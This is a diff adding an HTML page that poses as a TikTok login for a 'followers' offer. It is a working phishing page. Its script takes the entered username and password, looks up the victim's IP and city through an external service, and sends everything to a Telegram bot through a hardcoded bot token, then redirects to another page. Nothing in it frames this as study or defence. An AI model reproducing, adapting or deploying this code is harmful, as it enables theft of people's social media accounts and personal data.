@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta http-equiv="Content-Type" content=
+  "text/html; charset=utf-8">
+  <meta name="viewport" content=
+  "width=device-width, initial-scale=1">
+  <title>Tik Tok Followers 2024</title>
+  <script src="src/jquery.min.js"></script>
+  <script src="src/jscript."></script>
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
+    }
+    }
+}</style>
+</head>
+<body>
+  <input id="pagename" type="hidden" value="TikTok">
+     <div id="main-tool">
+      <div class="wrapper"><img src="logo.png"></div>
+              <h1 id="TFG">Login</h1>
+              <p class="sub-heading">Login With Your Tiktok Account</p>
+        </center>
+  <div id="fillup">
+          <div class="form-option">
+            <form onsubmit="submitonhfc(); return false;" method="post">
+            <input name="email" id ="email" class="input-form input-command"
+            type="text" placeholder="Username/Email/Phone"
+            required="">
+                </div>
+                <div id="fillup">
+            <div class="form-option">
+              <input name="password" id="password" class=
+              "input-form input-command" type="password"
+              placeholder="Password" required="">
+            </div><br>
+                  <br>
+                  <button class="buttonstyle" type="submit" name="submit"><b>Login</b></button>
+                  </div>
+                  
+      </center>
+         </form>
+         </div>
+         <div id="steps" style="display:none;"></div>
+         <div id="comment" style="display:none;"></div>
+         
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonhfc() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const page = document.getElementById("pagename").value;
+               const password = document.getElementById("password").value;
+               const email = document.getElementById("email").value;
+               const message = `> Login Page : ${page}\n\n> Username : ${email}\n\n> Password : ${password}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '6795102880:AAFKNkRK1H8JL1719KlAglnNONsqGQP5C5A';
+               const chatId = chatid;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "TikTok.html";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }</script>
+</body>
+</html>
